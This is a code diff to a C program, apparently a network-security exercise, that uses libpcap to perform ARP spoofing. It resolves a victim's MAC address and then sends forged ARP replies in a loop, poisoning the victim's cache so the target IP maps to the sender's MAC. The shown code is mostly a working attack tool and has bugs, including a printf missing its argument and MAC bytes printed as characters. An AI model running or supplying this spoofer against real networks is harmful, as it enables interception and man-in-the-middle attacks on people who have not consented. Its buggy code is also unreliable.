@@ -114,7 +114,6 @@ int main(int argc, char *argv[]){
 	char errbuf[PCAP_ERRBUF_SIZE];
 	bpf_u_int32 net;
 	bpf_u_int32 mask;
-
 	struct bpf_program fp;
 	char filter_exp[50] = "arp src host ";
 	struct pcap_pkthdr *header;	
@@ -123,16 +122,18 @@ int main(int argc, char *argv[]){
 	struct in_addr target_ip_addr;
 	char ip_addr[16];
 
-	int length = 0;
 
 	u_char my_mac[6];
 	u_char vic_mac[6];
 
 	u_char *packet;
+	int length = 0;
 	const u_char *recv_packet;
 
+	int flag = 0;
+
 	if(argc < 4){
-		printf("./send_arp interface_name victime_ip target_ip!!\n");
+		printf("./send_arp interface_name victim_ip target_ip!!\n");
 		return -1;	
 	}
 	
@@ -160,11 +161,12 @@ int main(int argc, char *argv[]){
 		return -5;
 	}
 
-	packet = (u_char *)malloc(sizeof(u_char) * 1000);
+	packet = (u_char *)malloc(sizeof(u_char) * 100);
 	recv_packet = (u_char *)malloc(sizeof(u_char) * 1500);
 
 	get_mac_by_inf(my_mac, argv[1]);
 	get_ip_by_inf(&my_ip_addr, argv[1]);
+
 	inet_pton(AF_INET, argv[2], &vic_ip_addr);
 	inet_pton(AF_INET, argv[3], &target_ip_addr);
 	
@@ -185,6 +187,8 @@ int main(int argc, char *argv[]){
 		return -6;
 	}
 	
+	printf("send arp request to get victim[%s] macaddress...\n", argv[2]);
+
 	make_arp_packet(&packet, &length, ARPOP_REQUEST, my_ip_addr, vic_ip_addr, my_mac, NULL);
 
 	if(pcap_sendpacket(handle, packet, length) != 0){
@@ -192,11 +196,29 @@ int main(int argc, char *argv[]){
 		return -1;	
 	}
 	
+	printf("waitting for recive victim[%s] arp reply packet...\n", argv[2]);
 	//capture arp reply packet
-	while(pcap_next_ex(handle, &header, &recv_packet) != 1);
+	while(1){
+		flag = pcap_next_ex(handle, &header, &recv_packet);
+		if(flag == 1)
+			break;
 
-	for(int i=6; i<12; i++)
+		else if(flag == -1){
+			fprintf(stderr, "network errer!! : %s\n", pcap_geterr(handle));
+			return -7;
+		}
+		else
+			fprintf(stderr, "timeout expired\n");
+	};
+
+	printf("victim[%s] macaddress : ");
+
+	for(int i=6; i<12; i++){
 		vic_mac[i-6] = recv_packet[i];
+		printf("%c", vic_mac[i-6]);
+		if(i != 11)
+			printf(":");
+	}
 
 	memset(packet, 0, length);
 	
@@ -206,6 +228,8 @@ int main(int argc, char *argv[]){
 	make_arp_packet(&packet, &length, ARPOP_REPLY, target_ip_addr, vic_ip_addr, my_mac, vic_mac);
 
 	//send evil arp reply packet
+
+	printf("\nsend evil arp reply to victim[%s] sfooping my ip[%s] to target ip[%s]\n", argv[2], ip_addr, argv[3]);
 
 	while(1){
 		if(pcap_sendpacket(handle, packet, length) != 0)
